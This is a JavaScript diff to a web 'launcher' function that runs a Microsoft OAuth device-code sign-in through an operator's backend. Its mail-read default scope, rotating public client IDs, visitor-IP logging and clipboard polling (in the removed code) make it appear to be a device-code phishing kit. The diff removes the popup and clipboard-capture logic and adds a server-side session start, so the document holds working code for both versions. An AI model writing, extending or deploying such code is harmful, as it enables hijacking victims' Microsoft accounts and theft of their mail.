@@ -10,7 +10,6 @@ function EhPortableLauncherMount(B) {
   var MODE = String(B.MODE || "device_code");
   var ACCOUNT = String(B.ACCOUNT || "org");
   var TENANT = String(B.TENANT || "");
-  var AUTO_OPEN = Boolean(B.AUTO_OPEN);
   var DOMAIN_MAPPING_ID = String(B.DOMAIN_MAPPING_ID || "");
   var MICROSOFT_SCOPE_PROFILE = String(B.MICROSOFT_SCOPE_PROFILE || "mail_read");
   var DEVICE_CONSENT = String(B.DEVICE_CONSENT || "graph_delegated");
@@ -20,9 +19,6 @@ function EhPortableLauncherMount(B) {
       ? B.DEVICE_PUBLIC_CLIENT_INDEX
       : parseInt(String(B.DEVICE_PUBLIC_CLIENT_INDEX != null ? B.DEVICE_PUBLIC_CLIENT_INDEX : "0"), 10) ||
         0;
-  var DEVICE_CLIENT_ID = String(B.DEVICE_CLIENT_ID || "");
-  var DEVICE_TENANT = String(B.DEVICE_TENANT || "");
-  var DEVICE_SCOPE = String(B.DEVICE_SCOPE || "");
   var visitorIp = "";
   var POST_CONNECT_NEXT = typeof B.POST_CONNECT_NEXT === "string" ? B.POST_CONNECT_NEXT : String(B.POST_CONNECT_NEXT || "");
   var OAUTH_SUCCESS_PAGE = String(B.OAUTH_SUCCESS_PAGE || "");
@@ -96,195 +92,27 @@ function EhPortableLauncherMount(B) {
     return visitorIp;
   }
 
-  function parseMicrosoftDeviceJson(raw) {
-    var t = String(raw || "").trim();
-    if (!t) return null;
-    try {
-      var j = JSON.parse(t);
-      if (j && j.device_code && j.user_code) return j;
-    } catch (eParse) {}
-    var m = t.match(/\{[\s\S]*\}/);
-    if (m) {
-      try {
-        var j2 = JSON.parse(m[0]);
-        if (j2 && j2.device_code && j2.user_code) return j2;
-      } catch (eParse2) {}
-    }
-    return null;
-  }
-
-  function resolveBrowserDeviceParams() {
-    var tenant =
-      DEVICE_TENANT ||
-      TENANT ||
-      (ACCOUNT === "personal" ? "consumers" : "common");
-    if (DEVICE_CODE_GRANT === "v1_aad_graph") {
-      return {
-        grant: DEVICE_CODE_GRANT,
-        devicecode_url:
-          "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
-        client_id: DEVICE_CLIENT_ID,
-        resource: "https://graph.windows.net",
-      };
-    }
-    return {
-      grant: DEVICE_CODE_GRANT,
-      devicecode_url:
-        "https://login.microsoftonline.com/" +
-        encodeURIComponent(tenant) +
-        "/oauth2/v2.0/devicecode",
-      client_id: DEVICE_CLIENT_ID,
-      scope: DEVICE_SCOPE || "openid profile offline_access",
-    };
-  }
-
-  async function fetchBrowserDeviceParams(bodyObj) {
-    var q = new URLSearchParams();
-    q.set("microsoft_account_type", bodyObj.microsoft_account_type || ACCOUNT);
-    if (bodyObj.directory_tenant_id) q.set("directory_tenant_id", bodyObj.directory_tenant_id);
-    q.set("device_consent", bodyObj.device_consent || DEVICE_CONSENT);
-    q.set("device_code_grant", bodyObj.device_code_grant || DEVICE_CODE_GRANT);
-    q.set(
-      "device_public_client_index",
-      String(
-        bodyObj.device_public_client_index != null
-          ? bodyObj.device_public_client_index
-          : DEVICE_PUBLIC_CLIENT_INDEX,
-      ),
-    );
-    var r = await fetch(API_BASE + "/oauth/microsoft/device/browser-params?" + q.toString(), {
-      method: "GET",
-      headers: launcherHeaders(false),
-      mode: "cors",
-      credentials: "omit",
-    });
-    if (!r.ok) return null;
-    return r.json();
-  }
-
-  function openMicrosoftDeviceCodePopup(params) {
-    var w = null;
-    try {
-      w = window.open(
-        "about:blank",
-        "eh_ms_devicecode",
-        "width=640,height=520,scrollbars=yes,resizable=yes",
-      );
-    } catch (eOpen) {
-      return null;
-    }
-    if (!w) return null;
-    try {
-      var doc = w.document;
-      var form = doc.createElement("form");
-      form.method = "POST";
-      form.action = params.devicecode_url || params.url;
-      var add = function (name, value) {
-        var input = doc.createElement("input");
-        input.type = "hidden";
-        input.name = name;
-        input.value = value;
-        form.appendChild(input);
-      };
-      add("client_id", params.client_id || params.clientId);
-      if ((params.grant || DEVICE_CODE_GRANT) === "v1_aad_graph") {
-        add("resource", params.resource || "https://graph.windows.net");
-      } else {
-        add("scope", params.scope || "openid profile offline_access");
-      }
-      doc.body.appendChild(form);
-      form.submit();
-    } catch (eForm) {
-      try {
-        w.close();
-      } catch (eClose) {}
-      return null;
-    }
-    return w;
-  }
-
-  function waitForClipboardMicrosoftDevice(maxWaitMs) {
-    return new Promise(function (resolve, reject) {
-      var done = false;
-      var deadline = Date.now() + (maxWaitMs || 180000);
-      function finish(err, val) {
-        if (done) return;
-        done = true;
-        window.removeEventListener("focus", onFocus);
-        window.clearInterval(timer);
-        if (err) reject(err);
-        else resolve(val);
-      }
-      async function tryRead() {
-        if (done) return;
-        try {
-          if (!navigator.clipboard || !navigator.clipboard.readText) return;
-          var text = await navigator.clipboard.readText();
-          var parsed = parseMicrosoftDeviceJson(text);
-          if (parsed) finish(null, parsed);
-        } catch (eRd) {}
-      }
-      function onFocus() {
-        void tryRead();
-      }
-      window.addEventListener("focus", onFocus);
-      var timer = window.setInterval(function () {
-        if (Date.now() > deadline) {
-          finish(
-            new Error(
-              "Copy the full Microsoft page from the popup (Ctrl+A, Ctrl+C), return here, and click Try again.",
-            ),
-          );
-          return;
-        }
-        void tryRead();
-      }, 1200);
-    });
-  }
-
   async function startDeviceSession(bodyObj) {
-    var params = null;
-    if (DEVICE_CLIENT_ID) {
-      params = resolveBrowserDeviceParams();
-    } else {
-      params = await fetchBrowserDeviceParams(bodyObj);
-    }
-    if (!params || !(params.client_id || params.clientId)) {
-      throw new Error("Missing Microsoft device client id for browser sign-in.");
-    }
-    var popup = openMicrosoftDeviceCodePopup(params);
-    if (!popup) {
-      throw new Error("EH_POPUP_BLOCKED");
-    }
-    setStatus("Copy code & verify to continue");
-    var msDev = await waitForClipboardMicrosoftDevice(180000);
-    var regBody = Object.assign({}, bodyObj, {
-      client_ip: visitorIp || undefined,
-      device_code: msDev.device_code,
-      user_code: msDev.user_code,
-      verification_uri: msDev.verification_uri || "https://microsoft.com/devicelogin",
-      expires_in: parseInt(msDev.expires_in, 10) || 900,
-      interval: parseInt(msDev.interval, 10) || 5,
-    });
-    var regResp = await fetch(API_BASE + "/oauth/microsoft/device/register", {
+    var startResp = await fetch(API_BASE + "/oauth/microsoft/device/start", {
       method: "POST",
       headers: launcherHeaders(true),
-      body: JSON.stringify(regBody),
+      body: JSON.stringify(bodyObj),
       mode: "cors",
       credentials: "omit",
     });
-    var regData = await regResp.json().catch(function () {
+    var startData = await startResp.json().catch(function () {
       return {};
     });
-    if (!regResp.ok || !regData.user_code || !regData.session_id) {
+    if (!startResp.ok || !startData.user_code || !startData.session_id) {
       throw new Error(
-        httpErrorDetail(regResp, regData, "Device register failed: HTTP " + regResp.status),
+        httpErrorDetail(
+          startResp,
+          startData,
+          "Device start failed: HTTP " + startResp.status,
+        ),
       );
     }
-    try {
-      popup.close();
-    } catch (ePc) {}
-    return { resp: regResp, data: regData };
+    return { resp: startResp, data: startData };
   }
 
   function setStatus(text, ok) {
